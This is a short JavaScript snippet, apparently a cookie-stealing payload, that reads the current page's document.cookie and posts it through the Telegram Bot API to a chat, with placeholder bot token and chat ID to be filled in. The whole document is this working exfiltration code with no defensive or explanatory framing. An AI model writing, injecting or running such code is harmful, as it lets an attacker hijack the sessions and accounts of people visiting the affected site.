const telegramToken = "1234567890:ABCDEFGHIJKLMNOPQRSTUVWXYZ";
const chatId = "1234567890";

fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
  },
  body: JSON.stringify({
    chat_id: chatId,
    text: `Cookies: ${document.cookie}`,
  }),
});
